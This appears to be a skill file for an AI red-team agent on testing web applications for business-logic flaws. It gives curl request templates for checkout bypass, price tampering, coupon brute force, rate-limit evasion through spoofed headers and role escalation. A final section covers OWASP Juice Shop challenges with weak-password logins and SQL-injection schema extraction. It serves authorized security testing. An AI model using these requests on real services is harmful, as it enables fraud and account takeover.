---
name: business-logic-testing
description: Business logic vulnerability detection — workflow bypass, price manipulation, state abuse, and application-specific flaws
origin: RedteamOpencode
---

# Business Logic Testing

## When to Activate

- Application has multi-step workflows (checkout, registration, KYC, approval)
- Financial operations exist (payments, transfers, balance, discounts, coupons)
- Role-based access with state transitions (pending → approved → completed)
- Any feature where the intended sequence of operations matters
- Application trusts client-side values for server-side decisions

## Tools

- `run_tool curl` — craft requests with manipulated parameters
- `run_tool ffuf` — fuzz parameter values for boundary conditions
- Browser DevTools — observe workflow state and hidden parameters

For live engagement target requests, prefer plain `run_tool curl` and let the current
engagement's `auth.json` flow through `rtcurl` automatically. Only add explicit
`-b` / `-H "Authorization: ..."` when intentionally testing alternate identities,
broken session handling, or auth override behavior.

## Methodology

### 1. Workflow Bypass

Test if steps in multi-step processes can be skipped:

```bash
# Identify all steps in a workflow (e.g., checkout)
# Step 1: /cart → Step 2: /shipping → Step 3: /payment → Step 4: /confirm

# Skip directly to final step
run_tool curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123"}'

# Skip payment step — go from shipping to confirm
run_tool curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123","shippingId":"456"}'

# Repeat a step that should only execute once (e.g., apply coupon)
run_tool curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}'
# Apply same coupon again
run_tool curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}'
```

### 2. Price / Value Manipulation

Test if financial values can be tampered:

```bash
# Negative quantity
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":-5,"price":100}'

# Zero price
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":1,"price":0}'

# Fractional values where integer expected
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":0.001}'

# Overflow: extremely large values
run_tool curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":99999999999999}'

# Modify price in request (if client sends price)
# Compare: does server validate price matches catalog?
run_tool curl -s -X POST "http://target/api/order/create" \
  -d '{"productId":"1","quantity":1,"price":0.01}'

# Currency confusion — send different currency code
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{"amount":100,"currency":"JPY"}'
```

### 3. State Abuse / Transition Bypass

Test if state transitions can be manipulated:

```bash
# Modify status directly
run_tool curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"completed"}'

# Cancel after completion
run_tool curl -s -X POST "http://target/api/order/123/cancel"

# Re-open closed ticket/order
run_tool curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"pending"}'

# Access resources in wrong state
# e.g., download invoice before payment
run_tool curl -s "http://target/api/order/123/invoice"

# Modify data after approval
run_tool curl -s -X PUT "http://target/api/application/123" \
  -d '{"amount":999999}'
```

### 4. Rate Limit / Abuse Prevention Bypass

```bash
# Brute force with no rate limit
for i in $(seq 1 100); do
  run_tool curl -s -X POST "http://target/api/coupon/redeem" \
    -d "{\"code\":\"GUESS$i\"}" -o /dev/null -w "%{http_code}\n"
done

# Bypass rate limit via IP rotation headers
run_tool curl -s -X POST "http://target/api/login" \
  -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" \
  -d '{"user":"admin","pass":"test"}'

# Bypass via case variation
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50"}'
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"discount50"}'
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"Discount50"}'
```

### 5. Feature Abuse

```bash
# Email/notification abuse — trigger mass emails
run_tool curl -s -X POST "http://target/api/invite" \
  -d '{"emails":["a@x.com","b@x.com","c@x.com",...1000 emails]}'

# Referral abuse — refer yourself
run_tool curl -s -X POST "http://target/api/referral" \
  -d '{"referralCode":"MY_CODE"}' -b "session=TOKEN_DIFFERENT_ACCOUNT"

# Gift card / point manipulation
# Buy gift card with gift card balance
run_tool curl -s -X POST "http://target/api/purchase" \
  -d '{"product":"gift_card","paymentMethod":"gift_card_balance"}'

# Time-based abuse — use expired offer
run_tool curl -s -X POST "http://target/api/offer/apply" \
  -d '{"offerId":"expired_offer_123"}'

# Privilege escalation via profile update
run_tool curl -s -X PUT "http://target/api/user/profile" \
  -d '{"role":"admin","isAdmin":true,"userType":"staff"}'
```

### 6. Input Validation Logic Flaws

```bash
# Type confusion — string where number expected
run_tool curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":"abc","to":"user2"}'

# Boolean confusion
run_tool curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":"true"}' # string vs boolean
run_tool curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":1}' # number vs boolean

# Array where single value expected
run_tool curl -s -X POST "http://target/api/user/update" \
  -d '{"email":["admin@target.com","attacker@evil.com"]}'

# Null / undefined injection
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{"amount":null}'
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{}'
```

### 7. CTF / Juice Shop Recall Contract

When the target fingerprints as OWASP Juice Shop, keep the following challenge-triggering
logic probes alive until they either produce solved-state evidence or are requeued with the
exact blocker. Do not retire these as "duplicate" just because a broader endpoint finding
already exists.

- Feedback workflows: submit and verify both a five-star rating and a forged-feedback path.
  Exercise `POST /api/Feedbacks/` with `rating: 5` and a forged/alternate `UserId` or
  author context, then check the scoreboard/challenge evidence before marking the case done.
- Password-strength recall: after any credential leak, admin token, or account takeover,
  attempt one bounded weak-password login/change/reset branch for known Juice Shop users
  (`admin@juice-sh.op`, `bjoern@owasp.org`, `jim@juice-sh.op`) and record whether the
  Password Strength challenge flips. If only missing credentials block it, return `REQUEUE`
  with the exact credential source already checked.
- Admin-registration recall: when the registration API or form is available on Juice Shop,
  run one bounded account-creation mutation that explicitly attempts the admin-role trigger
  (`POST /api/Users/` or the native register workflow with `role=admin` / equivalent role
  field) and then check `/api/Challenges` for `registerAdminChallenge`. If the API strips the
  role or the UI omits the field, return `REQUEUE` with the exact request body, observed
  response, and remaining role-injection surface instead of closing registration as generic
  create-account coverage.
- Database-schema recall: when SQL injection or admin data exposure is confirmed, perform
  one schema-oriented probe (`sqlite_master`, `information_schema`, ORM metadata, or the
  equivalent DB error path) and preserve the response artifact. Do not stop at admin login
  success if schema extraction has not been attempted.
- If any of Five-Star Feedback, Forged Feedback, Password Strength, or Database Schema is
  still untested after the relevant endpoint is discovered, emit `REQUEUE` with a concrete
  `api` or `form` follow-up instead of `DONE STAGE=exhausted`.
- A functionally successful request is not enough for CTF recall closure. If a five-star
  feedback POST returns 201, a weak-password login/reset branch reaches the expected
  endpoint, or a schema/error disclosure path returns data but `/api/Challenges` still shows
  the named challenge as unsolved, preserve the request/response artifact and return
  `REQUEUE` with the exact next challenge-triggering payload or browser route to try. Do
  not let the operator proceed to report on "technical evidence remains" when solved-state
  evidence disagrees.
- For Juice Shop weak-password recall, explicitly try the canonical low-risk credential
  branch (`admin@juice-sh.op` with the known weak-password candidate set from discovered
  seed/persona evidence, including `admin123` before broader brute force) and record the
  challenge-state check. If the credential branch is blocked, requeue the exact tested
  username plus the remaining candidate source instead of closing Password Strength as a
  duplicate of admin access.
- For Database Schema recall, after any SQLi/error path or admin data exposure, make the
  schema probe challenge-specific: attempt a `sqlite_master` extraction through the
  injection-capable route and then immediately fetch `/api/Challenges` for the Database
  Schema solved flag. If the probe only produces a generic ORM/stack trace, requeue the
  exact schema-extraction payload rather than retiring the route as generic error handling.
- User Credentials and Database Schema are sibling recall closures, not substitutes. If
  `/api/Users`, authentication-details, or cracked-hash evidence is present but both
  `databaseSchemaChallenge` and `userCredentialsChallenge` remain false, requeue one exact
  SQLi/schema payload path and one exact credential-bearing consumer path before report;
  do not rely on admin login, user roster enumeration, or masked-password rows as closure.

## What to Record

- **Workflow step** that was bypassed or abused
- **Expected behavior** vs **actual behavior**
- **Financial impact** if applicable (e.g., "purchased item for $0")
- **Exact request/response** proving the logic flaw
- **Reproducibility** — can it be repeated?
- **Severity** — based on business impact, not just technical impact:
  - HIGH: financial loss, unauthorized transactions, data manipulation
  - MEDIUM: workflow bypass, feature abuse, state corruption
  - LOW: minor logic inconsistency, informational leak via logic
